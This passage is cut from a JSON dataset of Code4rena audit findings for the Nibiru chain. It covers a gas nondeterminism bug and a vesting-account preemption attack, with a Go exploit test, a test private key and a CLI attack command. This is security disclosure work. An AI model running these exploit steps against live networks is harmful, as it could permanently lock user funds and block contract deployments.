[bank_extension.go](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/bank_extension.go):\n\n```go\ntype NibiruBankKeeper struct {\n    bankkeeper.BaseKeeper\n    StateDB *statedb.StateDB  // This shared pointer causes the issue\n}\n\nfunc (evmKeeper *Keeper) NewStateDB(\n    ctx sdk.Context, txConfig statedb.TxConfig,\n) *statedb.StateDB {\n    stateDB := statedb.New(ctx, evmKeeper, txConfig)\n    evmKeeper.Bank.StateDB = stateDB // Modifies shared state\n    return stateDB\n}\n```\n\n## Recommended mitigation steps\n\nThere are several ways to fix this issue:\n\n1. Clone the StateDB for read-only operations:\n```go\nfunc (k Keeper) EstimateGas(ctx sdk.Context, msg core.Message) (uint64, error) {\n    originalStateDB := k.Bank.StateDB\n    k.Bank.StateDB = originalStateDB.Copy()\n    defer func() {\n        k.Bank.StateDB = originalStateDB\n    }()\n    // ... estimation logic\n}\n```\n\n2. Use context to pass StateDB instead of keeping it as a field:\n```go\ntype NibiruBankKeeper struct {\n    bankkeeper.BaseKeeper\n}\n\nfunc (bk *NibiruBankKeeper) SyncStateDBWithAccount(\n    ctx sdk.Context,\n    stateDB *statedb.StateDB,\n    acc sdk.AccAddress,\n) {\n    if stateDB == nil {\n        return\n    }\n    // ... state updates\n}\n```\n\n3. Implement a proper snapshot/restore mechanism:\n```go\ntype BankKeeperState struct {\n    stateDB *statedb.StateDB\n}\n\nfunc (bk *NibiruBankKeeper) Snapshot() *BankKeeperState {\n    return &BankKeeperState{stateDB: bk.StateDB}\n}\n\nfunc (bk *NibiruBankKeeper) Restore(state *BankKeeperState) {\n    bk.StateDB = state.stateDB\n}\n```\n\nThe solution must ensure:\n- Deterministic gas computation across all nodes\n- Proper isolation between read-only and state-modifying operations\n", "sections": {"description_md": "## Finding description and impact\n\nAn issue exists in Nibiru's implementation of the bank keeper and its interaction with the EVM's StateDB. The `NibiruBankKeeper` maintains a pointer field to `StateDB` that gets updated during read-only EVM operations (like `eth_estimateGas`), which then affects the gas computation of subsequent bank transactions.\n\nThe issue arises because the `StateDB` pointer in `NibiruBankKeeper` is modified during read-only operations, and the presence or absence of this pointer affects program flow in bank operations through nil checks:\n\n```go\nfunc (bk *NibiruBankKeeper) SyncStateDBWithAccount(ctx sdk.Context, acc sdk.AccAddress) {\n    // If there's no StateDB set, it means we're not in an EthereumTx.\n    if bk.StateDB == nil {\n        return\n    }\n    // ... state updates\n}\n```\n\nThis can lead to consensus failures as different nodes may compute different gas amounts for the same transaction (depending on if they previously executed a read only query via RPC), which should never happen.\n", "impact_md": null, "recommendation_md": "## Recommended mitigation steps\n\nThere are several ways to fix this issue:\n\n1. Clone the StateDB for read-only operations:\n```go\nfunc (k Keeper) EstimateGas(ctx sdk.Context, msg core.Message) (uint64, error) {\n    originalStateDB := k.Bank.StateDB\n    k.Bank.StateDB = originalStateDB.Copy()\n    defer func() {\n        k.Bank.StateDB = originalStateDB\n    }()\n    // ... estimation logic\n}\n```\n\n2. Use context to pass StateDB instead of keeping it as a field:\n```go\ntype NibiruBankKeeper struct {\n    bankkeeper.BaseKeeper\n}\n\nfunc (bk *NibiruBankKeeper) SyncStateDBWithAccount(\n    ctx sdk.Context,\n    stateDB *statedb.StateDB,\n    acc sdk.AccAddress,\n) {\n    if stateDB == nil {\n        return\n    }\n    // ... state updates\n}\n```\n\n3. Implement a proper snapshot/restore mechanism:\n```go\ntype BankKeeperState struct {\n    stateDB *statedb.StateDB\n}\n\nfunc (bk *NibiruBankKeeper) Snapshot() *BankKeeperState {\n    return &BankKeeperState{stateDB: bk.StateDB}\n}\n\nfunc (bk *NibiruBankKeeper) Restore(state *BankKeeperState) {\n    bk.StateDB = state.stateDB\n}\n```\n\nThe solution must ensure:\n- Deterministic gas computation across all nodes\n- Proper isolation between read-only and state-modifying operations\n", "poc_md": "## Proof of Concept\n\nThe vulnerability can be demonstrated through the following sequence:\n\n1. Initial state: Execute a bank send transaction and record gas used\n```go\n// Initial bank send\nsendMsg := banktypes.NewMsgSend(sender, receiver, coins)\ngasUsed1 := executeTx(sendMsg) // Records initial gas usage\n```\n\n2. Trigger a read-only operation that modifies the StateDB pointer\n```go\n// This can modify NibiruBankKeeper.StateDB depending on the tx content\nclient.EstimateGas(ethTx)\n```\n\n3. Execute the same bank send transaction again\n```go\ngasUsed2 := executeTx(sendMsg) // Different gas usage than gasUsed1 because bk.StateDB is no longer nil\n```\n\nThe key problematic code is in [bank_extension.go](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/bank_extension.go):\n\n```go\ntype NibiruBankKeeper struct {\n    bankkeeper.BaseKeeper\n    StateDB *statedb.StateDB  // This shared pointer causes the issue\n}\n\nfunc (evmKeeper *Keeper) NewStateDB(\n    ctx sdk.Context, txConfig statedb.TxConfig,\n) *statedb.StateDB {\n    stateDB := statedb.New(ctx, evmKeeper, txConfig)\n    evmKeeper.Bank.StateDB = stateDB // Modifies shared state\n    return stateDB\n}\n```\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/bank_extension.go#L84-L86\n\n**container:**\n# Vulnerability details\n", "full_markdown_body": "https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/bank_extension.go#L84-L86\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nAn issue exists in Nibiru's implementation of the bank keeper and its interaction with the EVM's StateDB. The `NibiruBankKeeper` maintains a pointer field to `StateDB` that gets updated during read-only EVM operations (like `eth_estimateGas`), which then affects the gas computation of subsequent bank transactions.\n\nThe issue arises because the `StateDB` pointer in `NibiruBankKeeper` is modified during read-only operations, and the presence or absence of this pointer affects program flow in bank operations through nil checks:\n\n```go\nfunc (bk *NibiruBankKeeper) SyncStateDBWithAccount(ctx sdk.Context, acc sdk.AccAddress) {\n    // If there's no StateDB set, it means we're not in an EthereumTx.\n    if bk.StateDB == nil {\n        return\n    }\n    // ... state updates\n}\n```\n\nThis can lead to consensus failures as different nodes may compute different gas amounts for the same transaction (depending on if they previously executed a read only query via RPC), which should never happen.\n\n## Proof of Concept\n\nThe vulnerability can be demonstrated through the following sequence:\n\n1. Initial state: Execute a bank send transaction and record gas used\n```go\n// Initial bank send\nsendMsg := banktypes.NewMsgSend(sender, receiver, coins)\ngasUsed1 := executeTx(sendMsg) // Records initial gas usage\n```\n\n2. Trigger a read-only operation that modifies the StateDB pointer\n```go\n// This can modify NibiruBankKeeper.StateDB depending on the tx content\nclient.EstimateGas(ethTx)\n```\n\n3. Execute the same bank send transaction again\n```go\ngasUsed2 := executeTx(sendMsg) // Different gas usage than gasUsed1 because bk.StateDB is no longer nil\n```\n\nThe key problematic code is in [bank_extension.go](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/bank_extension.go):\n\n```go\ntype NibiruBankKeeper struct {\n    bankkeeper.BaseKeeper\n    StateDB *statedb.StateDB  // This shared pointer causes the issue\n}\n\nfunc (evmKeeper *Keeper) NewStateDB(\n    ctx sdk.Context, txConfig statedb.TxConfig,\n) *statedb.StateDB {\n    stateDB := statedb.New(ctx, evmKeeper, txConfig)\n    evmKeeper.Bank.StateDB = stateDB // Modifies shared state\n    return stateDB\n}\n```\n\n## Recommended mitigation steps\n\nThere are several ways to fix this issue:\n\n1. Clone the StateDB for read-only operations:\n```go\nfunc (k Keeper) EstimateGas(ctx sdk.Context, msg core.Message) (uint64, error) {\n    originalStateDB := k.Bank.StateDB\n    k.Bank.StateDB = originalStateDB.Copy()\n    defer func() {\n        k.Bank.StateDB = originalStateDB\n    }()\n    // ... estimation logic\n}\n```\n\n2. Use context to pass StateDB instead of keeping it as a field:\n```go\ntype NibiruBankKeeper struct {\n    bankkeeper.BaseKeeper\n}\n\nfunc (bk *NibiruBankKeeper) SyncStateDBWithAccount(\n    ctx sdk.Context,\n    stateDB *statedb.StateDB,\n    acc sdk.AccAddress,\n) {\n    if stateDB == nil {\n        return\n    }\n    // ... state updates\n}\n```\n\n3. Implement a proper snapshot/restore mechanism:\n```go\ntype BankKeeperState struct {\n    stateDB *statedb.StateDB\n}\n\nfunc (bk *NibiruBankKeeper) Snapshot() *BankKeeperState {\n    return &BankKeeperState{stateDB: bk.StateDB}\n}\n\nfunc (bk *NibiruBankKeeper) Restore(state *BankKeeperState) {\n    bk.StateDB = state.stateDB\n}\n```\n\nThe solution must ensure:\n- Deterministic gas computation across all nodes\n- Proper isolation between read-only and state-modifying operations\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/bank_extension.go#L84-L86\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nAn issue exists in Nibiru's implementation of the bank keeper and its interaction with the EVM's StateDB. The `NibiruBankKeeper` maintains a pointer field to `StateDB` that gets updated during read-only EVM operations (like `eth_estimateGas`), which then affects the gas computation of subsequent bank transactions.\n\nThe issue arises because the `StateDB` pointer in `NibiruBankKeeper` is modified during read-only operations, and the presence or absence of this pointer affects program flow in bank operations through nil checks:\n\n```go\nfunc (bk *NibiruBankKeeper) SyncStateDBWithAccount(ctx sdk.Context, acc sdk.AccAddress) {\n    // If there's no StateDB set, it means we're not in an EthereumTx.\n    if bk.StateDB == nil {\n        return\n    }\n    // ... state updates\n}\n```\n\nThis can lead to consensus failures as different nodes may compute different gas amounts for the same transaction (depending on if they previously executed a read only query via RPC), which should never happen.\n\n## Proof of Concept\n\nThe vulnerability can be demonstrated through the following sequence:\n\n1. Initial state: Execute a bank send transaction and record gas used\n```go\n// Initial bank send \nsendMsg := banktypes.NewMsgSend(sender, receiver, coins)\ngasUsed1 := executeTx(sendMsg) // Records initial gas usage\n```\n\n2. Trigger a read-only operation that modifies the StateDB pointer\n```go\n// This can modify NibiruBankKeeper.StateDB depending on the tx content\nclient.EstimateGas(ethTx) \n```\n\n3. Execute the same bank send transaction again\n```go\ngasUsed2 := executeTx(sendMsg) // Different gas usage than gasUsed1 because bk.StateDB is no longer nil\n```\n\nThe key problematic code is in [bank_extension.go](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/bank_extension.go):\n\n```go\ntype NibiruBankKeeper struct {\n    bankkeeper.BaseKeeper\n    StateDB *statedb.StateDB  // This shared pointer causes the issue\n}\n\nfunc (evmKeeper *Keeper) NewStateDB(\n    ctx sdk.Context, txConfig statedb.TxConfig,\n) *statedb.StateDB {\n    stateDB := statedb.New(ctx, evmKeeper, txConfig)\n    evmKeeper.Bank.StateDB = stateDB // Modifies shared state\n    return stateDB\n}\n```\n\n## Recommended mitigation steps\n\nThere are several ways to fix this issue:\n\n1. Clone the StateDB for read-only operations:\n```go\nfunc (k Keeper) EstimateGas(ctx sdk.Context, msg core.Message) (uint64, error) {\n    originalStateDB := k.Bank.StateDB\n    k.Bank.StateDB = originalStateDB.Copy()\n    defer func() {\n        k.Bank.StateDB = originalStateDB\n    }()\n    // ... estimation logic\n}\n```\n\n2. Use context to pass StateDB instead of keeping it as a field:\n```go\ntype NibiruBankKeeper struct {\n    bankkeeper.BaseKeeper\n}\n\nfunc (bk *NibiruBankKeeper) SyncStateDBWithAccount(\n    ctx sdk.Context, \n    stateDB *statedb.StateDB,\n    acc sdk.AccAddress,\n) {\n    if stateDB == nil {\n        return\n    }\n    // ... state updates\n}\n```\n\n3. Implement a proper snapshot/restore mechanism:\n```go\ntype BankKeeperState struct {\n    stateDB *statedb.StateDB\n}\n\nfunc (bk *NibiruBankKeeper) Snapshot() *BankKeeperState {\n    return &BankKeeperState{stateDB: bk.StateDB}\n}\n\nfunc (bk *NibiruBankKeeper) Restore(state *BankKeeperState) {\n    bk.StateDB = state.stateDB\n}\n```\n\nThe solution must ensure:\n- Deterministic gas computation across all nodes\n- Proper isolation between read-only and state-modifying operations"}, "severity": "High", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/NibiruChain/nibiru", "org": "NibiruChain", "name": "nibiru", "commit": "f3cbcaec58f23c54f6b75204b0c4009856b47250", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-11-nibiru-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:15.445890+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:15.453827+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-11-nibiru-findings-060", "doc_id": "github:code-423n4/2024-11-nibiru-findings", "finding_index": 60, "page_start": null, "title": "Vesting Account Preemption Attack Preventing Future Contract Deployment", "short_summary": null, "description_md": "## Finding description and impact\n\nThis vulnerability allows an attacker to preemptively set a target address as a vesting account, permanently blocking contract deployments by Factory contracts or other users to that address. Once the address is marked as a vesting account, any deployment attempt stores the contract bytecode in the state without creating a codeHash, rendering the contract permanently inaccessible.\n\nFor example, an attacker could target critical ecosystem addresses, such as those planned for LayerZero or Uniswap, and preemptively mark them as vesting accounts. This would effectively orphan the contract bytecode at these addresses, with no way to interact with or access it. The severity is compounded if funds are deployed with the contract, as these would also be irretrievable.\n\nIf exploited, this vulnerability allows an attacker to lock up critical addresses by setting them as vesting accounts, resulting in lost contracts with unreachable bytecode and permanently inaccessible funds. For ecosystem-critical contracts or high-value deployments, this could disrupt functionality and lead to substantial, irreversible losses.\n", "full_markdown": "# Lines of code\n\nhttps://github.com/NibiruChain/nibiru/blob/f3cbcaec58f23c54f6b75204b0c4009856b47250/x/evm/keeper/statedb.go#L130-L134\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nThis vulnerability allows an attacker to preemptively set a target address as a vesting account, permanently blocking contract deployments by Factory contracts or other users to that address. Once the address is marked as a vesting account, any deployment attempt stores the contract bytecode in the state without creating a codeHash, rendering the contract permanently inaccessible.\n\nFor example, an attacker could target critical ecosystem addresses, such as those planned for LayerZero or Uniswap, and preemptively mark them as vesting accounts. This would effectively orphan the contract bytecode at these addresses, with no way to interact with or access it. The severity is compounded if funds are deployed with the contract, as these would also be irretrievable.\n\nIf exploited, this vulnerability allows an attacker to lock up critical addresses by setting them as vesting accounts, resulting in lost contracts with unreachable bytecode and permanently inaccessible funds. For ecosystem-critical contracts or high-value deployments, this could disrupt functionality and lead to substantial, irreversible losses.\n\n## Proof of Concept\n\nThe following commit demonstrates the vulnerability through a step-by-step exploit:\n\n- Commit link: https://github.com/zsystm/nibiru-fork-for-audit/commit/9ea38e3e3a6bbc64bcbbd4271ca0f825d3a0259a (private repo)\n- Description: Key aspects of this vulnerability are demonstrated in `TestVestingAccountPreemptionAttack`, which provides a proof of concept for the vulnerability in the form of a test scenario.\n\nPlease provide your GitHub handles, and I will grant access to the private repository.\n\nFor quick reference before access permissions are granted, Ive included a core snippet of the reproduction code below.\n```go\nfunc (s *Suite) TestVestingAccountPreemptionAttack() {\n\tdeps := evmtest.NewTestDeps()\n\t// Step-1: Set up the deterministic victim account\n\tprivKeyE, _ := crypto.HexToECDSA(\"46e86cbf25a9aeb0630feebbb4ec22d6ee7acbdbde8b54d0382112c9b0cfe37c\")\n\tprivKey := &ethsecp256k1.PrivKey{\n\t\tKey: crypto.FromECDSA(privKeyE),\n\t}\n\tethAddr := crypto.PubkeyToAddress(privKeyE.PublicKey)\n\tdeps.Sender = evmtest.EthPrivKeyAcc{\n\t\tEthAddr:       ethAddr,\n\t\tNibiruAddr:    eth.EthAddrToNibiruAddr(ethAddr),\n\t\tPrivKey:       privKey,\n\t\tKeyringSigner: evmtest.NewSigner(privKey),\n\t}\n\tvictim := deps.Sender\n\tfundedAmount := evm.NativeToWei(big.NewInt(100))\n\tfundedCoin := sdk.NewCoins(sdk.NewCoin(\"unibi\", sdk.NewIntFromBigInt(fundedAmount)))\n\ts.Require().NoError(testapp.FundModuleAccount(deps.App.BankKeeper, deps.Ctx, authtypes.FeeCollectorName, fundedCoin))\n\ts.Require().NoError(testapp.FundAccount(deps.App.BankKeeper, deps.Ctx, victim.NibiruAddr, fundedCoin))\n\t// Step-2: Victim account deploys a Factory contract\n\tgasLimit := big.NewInt(3_000_000)\n\tinitialFundAmt := int64(10)\n\tinitialFundToFactory := evm.NativeToWei(big.NewInt(initialFundAmt))\n\tcreateArgs := evmtest.ArgsCreateContract{\n\t\tEthAcc:        victim,\n\t\tEthChainIDInt: deps.EvmKeeper.EthChainID(deps.Ctx),\n\t\tGasPrice:      big.NewInt(1),\n\t\tNonce:         deps.StateDB().GetNonce(victim.EthAddr),\n\t\tGasLimit:      gasLimit,\n\t\t// Factory send 999 wei when deploy Child contract. See x/evm/embeds/contracts/Factory.sol\n\t\tValue: initialFundToFactory,\n\t}\n\tethTxMsg, err := evmtest.DeployFactoryMsgEthereumTx(createArgs)\n\ts.Require().NoError(err)\n\ts.Require().NoError(ethTxMsg.ValidateBasic())\n\ts.Equal(ethTxMsg.GetGas(), gasLimit.Uint64())\n\tresp, err := deps.App.EvmKeeper.EthereumTx(sdk.WrapSDKContext(deps.Ctx), ethTxMsg)\n\ts.Require().NoError(\n\t\terr,\n\t\t\"resp: %s\\nblock header: %s\",\n\t\tresp,\n\t\tdeps.Ctx.BlockHeader().ProposerAddress,\n\t)\n\ts.Require().Empty(resp.VmError)\n\t// Check if the Factory contract is deployed\n\tfactoryAddr := crypto.CreateAddress(gethcommon.HexToAddress(victim.EthAddr.String()), 0)\n\tfactoryContractAcc := deps.App.EvmKeeper.GetAccount(deps.Ctx, factoryAddr)\n\ts.Require().NotNil(factoryContractAcc)\n\ts.Require().True(factoryContractAcc.IsContract())\n\tcodeHash := crypto.Keccak256Hash(embeds.SmartContract_Factory.DeployedBytecode)\n\ts.Require().Equal(embeds.SmartContract_Factory.DeployedBytecode, deps.App.EvmKeeper.GetCode(deps.Ctx, codeHash))\n\tfactoryBal := deps.App.BankKeeper.GetBalance(deps.Ctx, eth.EthAddrToNibiruAddr(factoryAddr), \"unibi\")\n\ts.Require().Equal(initialFundAmt, factoryBal.Amount.Int64())\n\t// Step-3: Attacker set expected Child contract address as vesting account\n\tattacker := evmtest.NewEthPrivAcc()\n\terr = testapp.FundAccount(\n\t\tdeps.App.BankKeeper,\n\t\tdeps.Ctx,\n\t\tattacker.NibiruAddr,\n\t\tsdk.NewCoins(sdk.NewInt64Coin(\"unibi\", 100000000)),\n\t)\n\t// NOTE: factory does not create any child contract yet, so the expected child address is 1\n\texpectedChildAddr := crypto.CreateAddress(factoryAddr, 1)\n\tvar msgServer vestingtypes.MsgServer\n\tmsgServer = vesting.NewMsgServerImpl(deps.App.AccountKeeper, deps.App.BankKeeper)\n\tlockedCoin := sdk.NewInt64Coin(\"unibi\", 100)\n\tlockResp, err := msgServer.CreatePermanentLockedAccount(deps.Ctx, vestingtypes.NewMsgCreatePermanentLockedAccount(\n\t\tattacker.NibiruAddr,\n\t\teth.EthAddrToNibiruAddr(expectedChildAddr),\n\t\tsdk.Coins{lockedCoin},\n\t))\n\ts.Require().NoError(err)\n\ts.Require().NotNil(lockResp)\n\t// Attacker successfully created a locked account with the expected child address\n\t// Step-4: Victim tries to deploy a child contract\n\tinput, err := embeds.SmartContract_Factory.ABI.Pack(\"makeChild\")\n\ts.Require().NoError(err)\n\texecArgs := evmtest.ArgsExecuteContract{\n\t\tEthAcc:          victim,\n\t\tEthChainIDInt:   deps.EvmKeeper.EthChainID(deps.Ctx),\n\t\tContractAddress: &factoryAddr,\n\t\tData:            input,\n\t\tGasPrice:        big.NewInt(1),\n\t\tNonce:           deps.StateDB().GetNonce(victim.EthAddr),\n\t\tGasLimit:        gasLimit,\n\t}\n\tethTxMsg, err = evmtest.ExecuteContractMsgEthereumTx(execArgs)\n\ts.Require().NoError(err)\n\ts.Require().NoError(ethTxMsg.ValidateBasic())\n\ts.Equal(ethTxMsg.GetGas(), gasLimit.Uint64())\n\t_, err = deps.App.EvmKeeper.EthereumTx(sdk.WrapSDKContext(deps.Ctx), ethTxMsg)\n\ts.Require().NoError(err)\n\t// PROOF OF IMPACTS\n\t// IMPACT-1(orphan contract): bytecode actually deployed but code hash is not set for the account because\n\t// the account's type is not EthAccountI, so it's not accessible.\n\tchildAcc := deps.App.EvmKeeper.GetAccount(deps.Ctx, expectedChildAddr)\n\ts.Require().Equal(evm.EmptyCodeHash, childAcc.CodeHash)\n\t// IMPACT-2(storage waste): bytecode deployed but no code hash, so the storage is wasted.\n\tchildCodeHash := crypto.Keccak256Hash(embeds.SmartContract_Child.DeployedBytecode)\n\tchildCode := deps.App.EvmKeeper.GetCode(deps.Ctx, childCodeHash)\n\ts.T().Logf(\"storage waste: %d bytes\", len(childCode))\n\t// IMPACT-3(locked fund): There are no way to access the locked fund because the account is not EthAccountI.\n\tacc := deps.App.AccountKeeper.GetAccount(deps.Ctx, eth.EthAddrToNibiruAddr(expectedChildAddr))\n\t_, ok := acc.(exported.VestingAccount)\n\ts.Require().True(ok)\n\tinput, err = embeds.SmartContract_Child.ABI.Pack(\"withdraw\")\n\ts.Require().NoError(err)\n\t// victim tries to withdraw the locked fund, but contract is orphan so no actual state transition happens\n\texecArgs = evmtest.ArgsExecuteContract{\n\t\tEthAcc:          victim,\n\t\tEthChainIDInt:   deps.EvmKeeper.EthChainID(deps.Ctx),\n\t\tContractAddress: &expectedChildAddr,\n\t\tData:            input,\n\t\tGasPrice:        big.NewInt(1),\n\t\tNonce:           deps.StateDB().GetNonce(attacker.EthAddr),\n\t\tGasLimit:        gasLimit,\n\t}\n\tethTxMsg, err = evmtest.ExecuteContractMsgEthereumTx(execArgs)\n\ts.Require().NoError(err)\n\t// No actual state transition happens.\n\t// Proof: Debug with breakpoints at https://github.com/NibiruChain/go-ethereum/blob/7fb652f186b09b81cce9977408e1aff744f4e3ef/core/vm/evm.go#L217-L219\n\t// code is nil, so just return without executing the contract\n\tdeps.App.EvmKeeper.EthereumTx(sdk.WrapSDKContext(deps.Ctx), ethTxMsg)\n}\n```\n\n### Test Code Walkthrough:\n\n1. A victim account is created, which deploys a factory contract along with a small fund (lines 244~289)\n    1. The factory contract deploys each child contract with 999 wei, so it requires a minimal balance. For further details, see `x/evm/embeds/contracts/Factory.sol`.\n2. Verify that the factory contract has been successfully deployed (lines 291298).\n3. Next, the attacker starts the preemption attack. The attacker anticipates the address of the child contract that the factory will deploy next. This is possible because the address generation for contracts is deterministic, based on the deployers address and nonce (line 309).\n4. The attacker creates a `PermanentLockedAccount` at the anticipated child contract address (lines 313319). This immediately disrupts the normal functionality of the first future child deployed by the factory. If the attacker creates vesting accounts across multiple nonces within a for loop, this would effectively block **any future child contract** deployments by the factory. The following steps demonstrate the resulting impacts.\n5. Attempt to deploy a child by calling `makeChild` on the factory contract (lines 322339). The transaction to deploy the child succeeds, but something has gone wrong.\n6. **Impact 1**: Although the bytecode has been stored in the state, no codeHash is mapped to the account. This is due to the internal logic in [`SetAccount`](https://github.com/NibiruChain/nibiru/blob/f3cbcaec58f23c54f6b75204b0c4009856b47250/x/evm/keeper/statedb.go#L114-L116), where the codeHash is only set if the account implements `EthAccountI`. Because the account here is a PermanentLockedAccount, the codeHash is not set. With no mapping between the contract address and the codeHash, the deployed bytecode is permanently inaccessible.\n7. **Impact 2**: Since the bytecode is permanently inaccessible, it wastes storage space in the state. In this PoC, the Child contract bytecode occupies 1,401 bytes, leading to 1,401 bytes of wasted storage.\n8. **Impact 3**: When the factory contract deploys a child, it transfers 999 wei to the new contract. To retrieve these funds, the withdraw function on the child contract should be called. However, because no codeHash exists in the state for the child contracts address, it is inaccessible. As a result, these funds are permanently locked. If this attack targeted large-scale contracts that deploy children with substantial amounts of funds, the potential loss could be significant.\n\n### Manual Reproduce\n\n- Set victim account with the private key `46e86cbf25a9aeb0630feebbb4ec22d6ee7acbdbde8b54d0382112c9b0cfe37c`.\n- Deploy factory contract using victim account.\n- Execute attack command: `nibid tx vesting create-permanent-locked-account nibi136uvp9vz8qplx4rc32fpju5natuacvvgau96c6 10unibi --from attacker`\n    - Ensure the target address is the expected child address of factory contract.\n- Attempt to call `Child.withdraw` from victim account. No state transition will occur, and no funds will be retrievable due to the missing codeHash.\n\n## Recommended mitigation steps\n\nThere are two potential approaches for patching this vulnerability: a fundamental patch and a more practical one.\n\nThe fundamental approach involves completely separating the Cosmos address system from the EVM address system. Currently, the bytes of an EVM address are directly used as Cosmos addresses, allowing them to share state, which enables this vulnerability. By fully decoupling these address systems, this issue could be prevented entirely. However, this would require a major design overhaul and is thus not a realistic solution.\n\nThe more practical approach is to disable the Vesting Account feature at the ante handler level. While this would prevent the use of vesting features, it is likely a necessary trade-off for security reasons.\n", "sections": {"description_md": "## Finding description and impact\n\nThis vulnerability allows an attacker to preemptively set a target address as a vesting account, permanently blocking contract deployments by Factory contracts or other users to that address. Once the address is marked as a vesting account, any deployment attempt stores the contract bytecode in the state without creating a codeHash, rendering the contract permanently inaccessible.\n\nFor example, an attacker could target critical ecosystem addresses, such as those planned for LayerZero or Uniswap, and preemptively mark them as vesting accounts. This would effectively orphan the contract bytecode at these addresses, with no way to interact with or access it. The severity is compounded if funds are deployed with the contract, as these would also be irretrievable.\n\nIf exploited, this vulnerability allows an attacker to lock up critical addresses by setting them as vesting accounts, resulting in lost contracts with unreachable bytecode and permanently inaccessible funds. For ecosystem-critical contracts or high-value deployments, this could disrupt functionality and lead to substantial, irreversible losses.\n", "impact_md": null, "recommendation_md": "## Recommended mitigation steps\n\nThere are two potential approaches for patching this vulnerability: a fundamental patch and a more practical one.\n\nThe fundamental approach involves completely separating the Cosmos address system from the EVM address system. Currently, the bytes of an EVM address are directly used as Cosmos addresses, allowing them to share state, which enables this vulnerability. By fully decoupling these address systems, this issue could be prevented entirely. However, this would require a major design overhaul and is thus not a realistic solution.\n\nThe more practical approach is to disable the Vesting Account feature at the ante handler level. While this would prevent the use of vesting features, it is likely a necessary trade-off for security reasons.\n", "poc_md": "## Proof of Concept\n\nThe following commit demonstrates the vulnerability through a step-by-step exploit:\n\n- Commit link: https://github.com/zsystm/nibiru-fork-for-audit/commit/9ea38e3e3a6bbc64bcbbd4271ca0f825d3a0259a (private repo)\n- Description: Key aspects of this vulnerability are demonstrated in `TestVestingAccountPreemptionAttack`, which provides a proof of concept for the vulnerability in the form of a test scenario.\n\nPlease provide your GitHub handles, and I will grant access to the private repository.\n\nFor quick reference before access permissions are granted, Ive included a core snippet of the reproduction code below.\n```go\nfunc (s *Suite) TestVestingAccountPreemptionAttack() {\n\tdeps := evmtest.NewTestDeps()\n\t// Step-1: Set up the deterministic victim account\n\tprivKeyE, _ := crypto.HexToECDSA(\"46e86cbf25a9aeb0630feebbb4ec22d6ee7acbdbde8b54d0382112c9b0cfe37c\")\n\tprivKey := &ethsecp256k1.PrivKey{\n\t\tKey: crypto.FromECDSA(privKeyE),\n\t}\n\tethAddr := crypto.PubkeyToAddress(privKeyE.PublicKey)\n\tdeps.Sender = evmtest.EthPrivKeyAcc{\n\t\tEthAddr:       ethAddr,\n\t\tNibiruAddr:    eth.EthAddrToNibiruAddr(ethAddr),\n\t\tPrivKey:       privKey,\n\t\tKeyringSigner: evmtest.NewSigner(privKey),\n\t}\n\tvictim := deps.Sender\n\tfundedAmount := evm.NativeToWei(big.NewInt(100))\n\tfundedCoin := sdk.NewCoins(sdk.NewCoin(\"unibi\", sdk.NewIntFromBigInt(fundedAmount)))\n\ts.Require().NoError(testapp.FundModuleAccount(deps.App.BankKeeper, deps.Ctx, authtypes.FeeCollectorName, fundedCoin))\n\ts.Require().NoError(testapp.FundAccount(deps.App.BankKeeper, deps.Ctx, victim.NibiruAddr, fundedCoin))\n\t// Step-2: Victim account deploys a Factory contract\n\tgasLimit := big.NewInt(3_000_000)\n\tinitialFundAmt := int64(10)\n\tinitialFundToFactory := evm.NativeToWei(big.NewInt(initialFundAmt))\n\tcreateArgs := evmtest.ArgsCreateContract{\n\t\tEthAcc:        victim,\n\t\tEthChainIDInt: deps.EvmKeeper.EthChainID(deps.Ctx),\n\t\tGasPrice:      big.NewInt(1),\n\t\tNonce:         deps.StateDB().GetNonce(victim.EthAddr),\n\t\tGasLimit:      gasLimit,\n\t\t// Factory send 999 wei when deploy Child contract. See x/evm/embeds/contracts/Factory.sol\n\t\tValue: initialFundToFactory,\n\t}\n\tethTxMsg, err := evmtest.DeployFactoryMsgEthereumTx(createArgs)\n\ts.Require().NoError(err)\n\ts.Require().NoError(ethTxMsg.ValidateBasic())\n\ts.Equal(ethTxMsg.GetGas(), gasLimit.Uint64())\n\tresp, err := deps.App.EvmKeeper.EthereumTx(sdk.WrapSDKContext(deps.Ctx), ethTxMsg)\n\ts.Require().NoError(\n\t\terr,\n\t\t\"resp: %s\\nblock header: %s\",\n\t\tresp,\n\t\tdeps.Ctx.BlockHeader().ProposerAddress,\n\t)\n\ts.Require().Empty(resp.VmError)\n\t// Check if the Factory contract is deployed\n\tfactoryAddr := crypto.CreateAddress(gethcommon.HexToAddress(victim.EthAddr.String()), 0)\n\tfactoryContractAcc := deps.App.EvmKeeper.GetAccount(deps.Ctx, factoryAddr)\n\ts.Require().NotNil(factoryContractAcc)\n\ts.Require().True(factoryContractAcc.IsContract())\n\tcodeHash := 